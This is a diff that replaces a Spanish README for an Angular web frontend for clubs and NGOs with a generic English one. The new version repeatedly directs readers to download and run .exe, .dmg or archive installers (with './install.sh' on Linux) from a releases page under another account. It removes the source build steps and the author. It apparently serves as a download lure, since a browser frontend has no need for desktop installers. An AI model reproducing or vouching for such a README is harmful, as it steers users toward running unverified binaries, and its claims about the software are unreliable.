@@ -1,260 +1,76 @@
-# 4x Web Software - Frontend
+# 🌟 4x-FrontEnd - Effortless NGO and Club Management
 
-Aplicación web frontend desarrollada con Angular para clubes deportivos, bomberos, ONGs, academias y otras entidades de cobros. Simplifica la administración, mejora la experiencia de los miembros y lleva tu organización al siguiente nivel con una solución 100% online, segura y adaptable.
+## 🚀 Overview
+4x-FrontEnd is a modern web application designed for managing non-governmental organizations (NGOs) and sports clubs. It leverages Angular and TypeScript to deliver a seamless experience, ensuring your organization's operations are smooth and efficient.
 
-<div align="center">
+## 📥 Download Now
+[![Download 4x-FrontEnd](https://img.shields.io/badge/Download-4x--FrontEnd-blue.svg)](https://github.com/vcant0/4x-FrontEnd/releases)
 
-![Angular](https://img.shields.io/badge/Angular-DD0031?style=for-the-badge&logo=angular&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white)
-![RxJS](https://img.shields.io/badge/RxJS-B7178C?style=for-the-badge&logo=reactivex&logoColor=white)
-![SASS](https://img.shields.io/badge/SASS-hotpink?style=for-the-badge&logo=sass&logoColor=white)
-![SSR](https://img.shields.io/badge/SSR-Universal-black?style=for-the-badge&logo=angular&logoColor=white)
+## 🖥️ System Requirements
+To run 4x-FrontEnd, ensure your system meets the following requirements:
 
-</div>
+- **Operating System**: Windows 10, macOS, or any modern Linux distribution
+- **Browser**: Latest version of Chrome, Firefox, Safari, or Edge
+- **Internet Connection**: Required for initial setup and updates
+- **RAM**: At least 4GB recommended
+- **Storage**: Minimum of 500MB free space
 
-## 📄 Sobre el Proyecto
+## 🚀 Getting Started
+### Step 1: Visit the Releases Page
+To download the application, start by visiting the Releases page. Here is the link:
 
-4x Web Software es una aplicación web frontend desarrollada con Angular que proporciona una interfaz moderna y responsiva para la gestión de organizaciones sin fines de lucro y entidades de cobros. El sistema incluye Server-Side Rendering (SSR) con Angular Universal, componentes modulares standalone, y características avanzadas de seguridad y validación.
+[Visit the Releases Page](https://github.com/vcant0/4x-FrontEnd/releases)
 
+### Step 2: Download the Latest Version
+On the Releases page, you will see a list of versions. Look for the latest version and click on it. 
 
-## ✨ Características Principales
+### Step 3: Choose Your File
+You will find several files available for download. Select the one that matches your operating system:
 
-- **🎨 Interfaz Moderna y Responsiva**: Diseño optimizado para todos los dispositivos (móvil, tablet, desktop) con componentes reutilizables
-- **📋 Sistema de FAQs Dinámico**: Gestión completa de preguntas frecuentes con búsqueda, filtrado por categorías y consumo de API REST
-- **📧 Formulario de Contacto Inteligente**: Sistema de contacto con validación avanzada, sanitización de inputs y protección contra XSS
-- **🔒 Seguridad Avanzada**: SecurityService que protege contra manipulaciones desde la consola del navegador, detección de DevTools y validación de datos
-- **⚡ Server-Side Rendering (SSR)**: Configurado con Angular Universal para mejor SEO y rendimiento
-- **🎯 Componentes Modulares**: Arquitectura basada en componentes standalone de Angular con lazy loading
-- **🔄 Integración con API REST**: Servicios HTTP configurados para consumir APIs externas
-- **🧪 Testing Configurado**: Framework de testing con Jasmine y Karma listo para uso
+- For **Windows**: Download the `.exe` file.
+- For **Mac**: Download the `.dmg` file.
+- For **Linux**: You may find a zip or tar.gz file.
 
-## 🛠️ Stack Tecnológico
+### Step 4: Install the Application
+After downloading the file, locate it in your downloads folder. Follow these instructions based on your operating system:
 
-- **Angular 20.3** - Framework principal
-- **TypeScript 5.9** - Lenguaje de programación
-- **RxJS 7.8** - Programación reactiva
-- **SCSS** - Preprocesador CSS
-- **Angular SSR** - Server-Side Rendering con Angular Universal
-- **Angular Forms (Reactive Forms)** - Gestión de formularios
-- **Angular Router** - Enrutamiento y navegación
-- **Angular HttpClient** - Comunicación con APIs REST
+- **Windows**:
+  1. Double-click the `.exe` file.
+  2. Follow the installation prompts.
+  
+- **Mac**:
+  1. Open the downloaded `.dmg` file.
+  2. Drag the app into the Applications folder.
 
-### Herramientas de Desarrollo
-- **Angular CLI 20.3** - Herramientas de línea de comandos
-- **Jasmine & Karma** - Testing framework
-- **TypeScript Compiler** - Compilación de TypeScript
+- **Linux**:
+  1. Extract the zip or tar.gz file.
+  2. Open a terminal and navigate to the extracted folder.
+  3. Use the command `./install.sh` to install the application.
 
-## 🚀 Comenzando
+### Step 5: Open the Application
+Once installed, you can find 4x-FrontEnd in your applications list. Open it and begin managing your organization.
 
-### Requisitos Previos
+## 🔒 Features
+- **Advanced Security**: Protects your data with high standards of encryption and user authentication.
+- **Reactive Forms**: Simplifies data entry with intuitive forms that adapt to user input.
+- **Modular Architecture**: Allows easy updates and maintenance, making future enhancements straightforward.
+- **SSR/Universal**: Optimizes load times for a better user experience across all devices.
 
-Antes de comenzar, asegúrate de tener instalado:
+## 📝 User Guide
+For detailed instructions on how to use 4x-FrontEnd, consult the user guide available within the app under the Help section. You can also find additional documentation on our repository.
 
-- **Node.js** (versión 18 o superior) - [Descargar Node.js](https://nodejs.org/)
-- **npm** (versión 9 o superior) - Viene incluido con Node.js
-- **Angular CLI** (opcional, se instala localmente) - Para comandos avanzados
+## 🛡️ Support
+If you run into any issues or have questions, feel free to reach out through the repository's Issues page. We are here to help you.
 
-### Instalación
+## 📜 License
+4x-FrontEnd is licensed under the MIT License. You can freely use and modify it according to the terms specified in the license file.
 
-1. **Clona el repositorio:**
-```bash
-git clone https://github.com/tu-usuario/4x.git
-cd 4x
-```
+## 💡 Feedback
+Your suggestions and feedback help us improve the application. Please share your thoughts on features you would like to see in future releases.
 
-2. **Instala las dependencias del frontend:**
-```bash
-cd ClientApp
-npm install
-```
+## 📥 Download & Install
+Don't forget to download the application from our Releases page:
 
-3. **Instala las dependencias del backend (opcional, si necesitas el servidor de desarrollo):**
-```bash
-cd ../server
-npm install
-```
+[Download 4x-FrontEnd](https://github.com/vcant0/4x-FrontEnd/releases)
 
-## 💻 Uso
-
-### Iniciar el Backend
-
-Para que la aplicación funcione correctamente, necesitas iniciar el servidor backend primero:
-
-1. **Navega a la carpeta del servidor:**
-```bash
-cd server
-```
-
-2. **Instala las dependencias (solo la primera vez):**
-```bash
-npm install
-```
-
-3. **Inicia el servidor backend:**
-```bash
-npm start
-```
-
-El servidor se ejecutará en `http://localhost:3000`
-
-**Alternativas para iniciar el backend:**
-
-Desde la raíz del proyecto:
-```bash
-npm run start:backend
-```
-
-O manualmente:
-```bash
-cd server && npm start
-```
-
-**Para desarrollo con auto-reload (si tienes nodemon instalado):**
-```bash
-cd server
-npm run dev
-```
-
-**Verificar que el backend funciona:**
-- Abre `http://localhost:3000/api/health` en tu navegador
-- Deberías ver: `{"status":"ok","message":"Backend funcionando correctamente"}`
-
-### Iniciar el Frontend
-
-Para ejecutar la aplicación frontend en modo desarrollo:
-
-**Terminal 1 - Backend (debe estar ejecutándose primero):**
-```bash
-cd server
-npm start
-```
-
-**Terminal 2 - Frontend:**
-```bash
-cd ClientApp
-npm start
-```
-
-O usando Angular CLI:
-```bash
-cd ClientApp
-ng serve
-```
-
-La aplicación estará disponible en `http://localhost:4200` y se recargará automáticamente cuando modifiques los archivos.
-
-**Nota:** El frontend está configurado para conectarse automáticamente al backend en `http://localhost:3000`. Asegúrate de que el backend esté ejecutándose antes de iniciar el frontend. La configuración se encuentra en `ClientApp/src/environments/environment.ts`:
-
-```typescript
-export const environment = {
-  production: false,
-  apiUrl: 'http://localhost:3000' // URL de tu API backend
-};
-```
-
-### Scripts Disponibles
-
-#### Desde ClientApp/:
-- `npm start` o `ng serve` - Inicia el servidor de desarrollo
-- `npm run build` o `ng build` - Construye la aplicación para producción
-- `npm test` o `ng test` - Ejecuta los tests unitarios
-- `npm run watch` - Construye en modo watch
-
-### Construcción para Producción
-
-```bash
-cd ClientApp
-npm run build -- --configuration production
-```
-
-Los archivos compilados estarán en `ClientApp/dist/clientapp/browser/`
-
-### Testing
-
-```bash
-cd ClientApp
-npm test
-```
-
-## 📂 Estructura del Proyecto
-
-```
-ClientApp/
-├── src/
-│   ├── app/
-│   │   ├── components/         # Componentes reutilizables
-│   │   │   ├── feature-card/   # Tarjeta de características
-│   │   │   ├── navbar/         # Barra de navegación
-│   │   │   ├── plan-card/      # Tarjeta de planes
-│   │   │   └── footer/         # Pie de página
-│   │   ├── pages/              # Páginas de la aplicación
-│   │   │   ├── inicio/         # Página principal
-│   │   │   ├── contacto/       # Página de contacto
-│   │   │   │   └── contacto-form/  # Formulario de contacto
-│   │   │   ├── faq/            # Página de preguntas frecuentes
-│   │   │   └── tutoriales/    # Página de tutoriales
-│   │   ├── services/           # Servicios (HTTP, seguridad)
-│   │   │   ├── faq.service.ts      # Servicio para FAQs
-│   │   │   └── security.service.ts # Servicio de seguridad
-│   │   ├── app.ts              # Componente principal
-│   │   ├── app.routes.ts       # Configuración de rutas
-│   │   ├── app.config.ts       # Configuración de la app
-│   │   └── shell.html          # Shell para SSR
-│   ├── assets/                 # Imágenes, iconos, etc.
-│   │   ├── clients/            # Imágenes de clientes
-│   │   ├── icons/              # Iconos SVG
-│   │   └── logo-*.png          # Logos
-│   ├── environments/           # Variables de entorno
-│   │   ├── environment.ts      # Configuración desarrollo
-│   │   └── environment.prod.ts # Configuración producción
-│   ├── index.html              # HTML principal
-│   ├── main.ts                 # Punto de entrada
-│   ├── main.server.ts          # Punto de entrada SSR
-│   ├── server.ts               # Configuración del servidor SSR
-│   └── styles.scss             # Estilos globales
-├── public/                     # Archivos públicos
-│   └── favicon.ico
-├── angular.json                 # Configuración de Angular
-├── package.json                 # Dependencias del proyecto
-├── tsconfig.json                # Configuración de TypeScript
-└── tsconfig.app.json            # Configuración TS para la app
-```
-
-## 🔒 Seguridad
-
-El proyecto incluye múltiples capas de seguridad:
-
-- **SecurityService**: Protección contra manipulaciones desde la consola del navegador
-- **Sanitización de Inputs**: Prevención de ataques XSS mediante sanitización automática
-- **Validación de Formularios**: Validación reactiva en cliente con Angular Forms
-- **Detección de DevTools**: Sistema de detección y protección contra herramientas de desarrollo
-- **Content Security Policy**: Configurado para producción
-- **Validación de Datos**: Validación de formularios antes de enviar al servidor
-
-## 📝 Notas Importantes
-
-- **Configuración de API**: Asegúrate de configurar correctamente la URL de tu API backend en `ClientApp/src/environments/environment.ts` y `environment.prod.ts` antes de desplegar.
-- **Server-Side Rendering**: El proyecto está configurado para SSR con Angular Universal. Para ejecutar en modo SSR, usa `npm run serve:ssr:clientapp` después de construir.
-- **Variables de Entorno**: Configura las variables de entorno según tu entorno (desarrollo/producción).
-
-## 🤝 Contribución
-
-Las contribuciones son bienvenidas. Para contribuir:
-
-1. Fork el proyecto
-2. Crea una rama para tu feature (`git checkout -b feature/AmazingFeature`)
-3. Commit tus cambios (`git commit -m 'Add some AmazingFeature'`)
-4. Push a la rama (`git push origin feature/AmazingFeature`)
-5. Abre un Pull Request
-
-## 📄 Licencia
-
-[Especificar licencia si aplica]
-
-## 👤 Autor
-
-**Mia Denise Eritier (NoahEritier)**
-
----
-
-Desarrollado con ❤️ para organizaciones modernas
+Thank you for choosing 4x-FrontEnd for your organization needs!
